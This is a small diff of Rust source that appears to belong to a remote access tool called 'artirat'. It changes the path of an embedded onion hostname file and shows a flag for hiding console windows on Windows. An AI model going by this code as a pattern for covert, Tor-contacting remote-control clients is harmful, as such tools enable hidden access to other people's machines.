@@ -52,7 +52,7 @@ use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-const CONFIG_HOSTNAME: &[u8] = include_bytes!("../../artirat-server/config/hostname");
+const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");
 
 fn get_onion_host() -> String {
     String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
